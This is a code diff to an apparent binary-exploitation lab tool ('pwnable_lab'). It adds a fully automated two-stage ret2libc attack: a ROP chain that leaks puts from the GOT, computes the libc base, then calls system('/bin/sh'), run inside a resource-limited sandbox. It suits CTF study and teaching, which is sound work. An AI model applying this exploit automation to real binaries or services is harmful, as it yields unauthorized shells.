@@ -4,6 +4,9 @@ from __future__ import annotations
 
 import hashlib
 import logging
+import os
+import stat
+import tempfile
 from dataclasses import asdict, dataclass
 
 from pwnable_lab.analyzer.checksec import run_checksec
@@ -26,6 +29,7 @@ from pwnable_lab.analyzer.strategy import (
     find_ret_gadget,
     inject_confirmed_offset,
     leak_plan,
+    ret2libc_plan,
     ret2system_plan,
     ret2win_target,
 )
@@ -35,6 +39,7 @@ from pwnable_lab.config import Settings
 from pwnable_lab.elf.parser import ElfImage, parse_elf
 from pwnable_lab.errors import AnalysisError
 from pwnable_lab.formats import ArtifactFormat, detect_format
+from pwnable_lab.payload.pack import RopStep, build_overflow
 from pwnable_lab.pe.analyzer import (
     disassemble_pe,
     disassemble_raw,
@@ -44,12 +49,16 @@ from pwnable_lab.pe.analyzer import (
 )
 from pwnable_lab.pe.parser import parse_pe
 from pwnable_lab.sandbox import (
+    SandboxLimits,
     confirm_offset_in_container,
     confirm_offset_in_process,
+    require_sandbox_boundary,
     require_sandbox_enabled,
+    run_two_stage,
     verify_exploit_in_container,
     verify_exploit_in_process,
 )
+from pwnable_lab.sandbox.libc import resolve_libc_symbols
 
 logger = logging.getLogger(__name__)
 
@@ -537,6 +546,118 @@ class AnalysisService:
             "reason": "leaked" if ok else "no-leak",
             "result": result,
         }
+
+    def auto_ret2libc(self, data: bytes, *, offset: int) -> dict:
+        """완전 자동 2단계 ret2libc: leak → libc base 계산 → system("/bin/sh").
+
+        1. `A*off + pop_rdi + puts@got + puts@plt + <재진입>` 로 런타임 puts 유출.
+        2. `libc_base = leaked - puts_offset` (실행 환경의 libc 심볼 오프셋 사용).
+        3. `A*off + pop_rdi + binsh + ret + system` 로 되쏘아 system 호출.
+
+        libc 가 다른 컨테이너 executor 에서는 미지원(콜백 기반 2단계 러너가 무상태
+        CLI 로 노출돼 있지 않음) — in-process 경로 전용.
+        """
+
+        require_sandbox_boundary(self.settings)
+        self._require_format(data, ArtifactFormat.ELF, feature="Auto ret2libc")
+        if self.settings.sandbox_executor == "container":
+            return {"attempted": False, "reason": "inprocess-only"}
+
+        image = parse_elf(data)
+        bplan = ret2libc_plan(image)
+        if bplan is None:
+            return {"attempted": False, "reason": "no-ret2libc-plan"}
+        libc = resolve_libc_symbols()
+        if libc is None:
+            return {"attempted": False, "reason": "no-libc-symbols"}
+
+        pop, ret = bplan["pop_rdi"], bplan["ret"]
+        prelude = (
+            build_overflow(
+                offset,
+                pop,
+                bits=64,
+                chain=[
+                    RopStep(bplan["puts_got"]),
+                    RopStep(bplan["puts_plt"]),
+                    RopStep(bplan["return_to"]),
+                ],
+            )
+            + b"\n"
+        )
+        captured: dict = {}
+
+        def make_second(first_line: bytes) -> bytes:
+            leaked = int.from_bytes(first_line[:6], "little")
+            base = leaked - libc["puts"]
+            captured.update(leaked=leaked, base=base)
+            return (
+                build_overflow(
+                    offset,
+                    pop,
+                    bits=64,
+                    chain=[
+                        RopStep(base + libc["binsh"]),
+                        RopStep(ret),
+                        RopStep(base + libc["system"]),
+                    ],
+                )
+                + b"\n"
+            )
+
+        limits = SandboxLimits(
+            wall_seconds=self.settings.sandbox_wall_seconds,
+            cpu_seconds=self.settings.sandbox_cpu_seconds,
+            address_space_bytes=self.settings.sandbox_address_space_bytes,
+        )
+        logger.warning("sandbox: auto ret2libc (offset=%d)", offset)
+        path = self._materialize(data)
+        try:
+            observation, _leaked_line = run_two_stage(
+                path, make_second, prelude=prelude, limits=limits
+            )
+        finally:
+            try:
+                os.unlink(path)
+            except OSError:
+                pass
+
+        base = captured.get("base")
+        rng = binary_exec_range(image)
+        rip = observation.rip
+        reached_libc = (
+            rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
+        )
+        # libc base 가 페이지 정렬이면 leak/오프셋 계산이 정확하다는 강한 신호.
+        base_ok = base is not None and base > 0 and base % 0x1000 == 0
+        succeeded = bool(base_ok and reached_libc)
+        return {
+            "attempted": True,
+            "technique": "ret2libc",
+            "libc_path": libc["path"],
+            "leaked_puts": captured.get("leaked"),
+            "leaked_puts_hex": (
+                None
+                if captured.get("leaked") is None
+                else f"0x{captured['leaked']:x}"
+            ),
+            "libc_base": base,
+            "libc_base_hex": None if base is None else f"0x{base:x}",
+            "libc_base_page_aligned": base_ok,
+            "reached_libc": reached_libc,
+            "return_to": bplan["return_to_name"],
+            "succeeded": succeeded,
+            "reason": "control-into-system" if succeeded else "did-not-reach-system",
+            "observation": observation.as_dict(),
+        }
+
+    @staticmethod
+    def _materialize(data: bytes) -> str:
+        fd, path = tempfile.mkstemp(prefix="plab-sbx-")
+        with os.fdopen(fd, "wb") as fh:
+            fh.write(data)
+        os.chmod(path, stat.S_IRWXU)
+        return path
 
     def _run_offset_confirmation(
         self, data: bytes, *, pattern_length: int | None, feature: str
